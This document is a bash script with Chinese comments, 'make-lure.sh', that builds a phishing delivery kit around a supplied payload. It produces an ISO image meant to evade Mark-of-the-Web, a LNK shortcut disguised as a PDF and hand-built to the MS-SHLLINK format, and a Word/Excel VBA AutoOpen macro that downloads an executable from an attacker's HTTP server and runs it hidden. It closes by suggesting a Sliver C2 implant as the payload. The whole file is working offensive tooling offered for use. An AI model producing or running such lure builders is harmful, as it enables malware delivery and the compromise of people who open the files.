#!/usr/bin/env bash
# make-lure.sh — 钓鱼投递物三件套:ISO(绕 Mark-of-the-Web)、LNK、VBA 宏模板
# 用法: ~/tools/bin/make-lure.sh <payload.exe> [输出目录,默认 ~/tools/lures/<ts>]
set -euo pipefail
[ $# -lt 1 ] && { echo "用法: $0 <payload.exe> [输出目录]"; exit 1; }
PAYLOAD="$(realpath "$1")"; [ -f "$PAYLOAD" ] || { echo "找不到 $PAYLOAD"; exit 1; }
OUT="${2:-$HOME/tools/lures/$(date +%Y%m%d-%H%M%S)}"
mkdir -p "$OUT"; cd "$OUT"
BASE=$(basename "$PAYLOAD"); STEM="${BASE%.*}"

# ① ISO:右键挂载执行,绕过 MotW(Windows 11 用户仍需双击)
mkdir -p iso && cp "$PAYLOAD" iso/ && \
printf '@echo off\r\nstart "" "%%~dp0%s"\r\n' "$BASE" > iso/启动.bat && \
printf '双击里面的 启动.bat\r\n' > iso/读我.txt && \
mkisofs -q -J -joliet-long -V "Docs_$(date +%s)" -o "$STEM.iso" iso/ && rm -rf iso

# ② LNK:伪装成 PDF 的快捷方式(目标藏参数)
python3 - "$PAYLOAD" "$OUT" "$STEM" <<'PY'
import sys, os, struct
payload, out, stem = sys.argv[1], sys.argv[2], sys.argv[3]
icon = r"C:\Windows\System32\shell32.dll"     # PDF 观感图标(icon_index=70)
target = r"C:\Windows\System32\cmd.exe"
args = f'/c start "" "{payload}"'
lnk_path = os.path.join(out, stem + ".lnk")
try:
    import pylnk3                              # 优先:合法 IDList + 完整 StringData
    lnk = pylnk3.for_file(target, arguments=args, description="文档",
                          icon_file=icon, icon_index=70)
    lnk.save(lnk_path)
except ImportError:
    # 手工构造(MS-SHLLINK):清 HasLinkTargetIDList(不写 IDList),
    # 每个 StringData 字段前置 16 位 CountCharacters(字符数,不含终止符)
    flags = 0x20 | 0x40 | 0x80   # HasLinkArguments | HasIconLocation | IsUnicode
    head = (
        struct.pack("<I", 0x4C)                                   # HeaderSize
        + bytes.fromhex("0114020000000000c000000000000046")       # LinkCLSID
        + struct.pack("<I", flags)                                # LinkFlags
        + struct.pack("<I", 0)                                    # FileAttributes
        + b"\x00" * 24                                            # Creation/Access/Write Time
        + struct.pack("<I", 0)                                    # FileSize
        + struct.pack("<I", 0)                                    # IconIndex
        + struct.pack("<I", 1)                                    # ShowCommand=SW_SHOWNORMAL
        + struct.pack("<H", 0)                                    # HotKey
        + b"\x00" * 10                                            # Reserved1/2/3
    )
    def s(x):  # StringData: CountCharacters(2 字节) + UTF-16LE 字符
        return struct.pack("<H", len(x)) + x.encode("utf-16le")
    lnk = head + s(args) + s(icon + ",70") + struct.pack("<I", 0)  # +TerminalBlock
    open(lnk_path, "wb").write(lnk)
print("LNK OK")
PY

# ③ VBA 宏模板(payload 走远程下载,不嵌文件)
cat > "$STEM-宏模板.bas" <<EOF
' 粘到 Word/Excel 宏(AutoOpen);payload 地址换成你的 http 服务
' 攻击机起服务: cd ~/tools/windows && python3 -m http.server 8080
Sub AutoOpen()
    Dim p As String: p = Environ("TEMP") & "\\$BASE"
    Dim x As Object: Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", "http://<攻击机IP>:8080/$BASE", False: x.send
    If x.Status = 200 Then
        Dim b() As Byte: b = x.responseBody
        Dim f As Integer: f = FreeFile
        Open p For Binary Access Write As #f: Put #f, , b: Close #f
        CreateObject("WScript.Shell").Run """" & p & """", 0, False
    End If
End Sub
EOF

sha256sum "$STEM.iso" "$STEM.lnk" > SHA256SUMS.txt
echo "投递物就绪: $OUT"; ls -la "$OUT"
echo "payload 建议:sliver generate --os windows --http <本机IP> --save ~/tools/windows/$(basename "$PAYLOAD")"
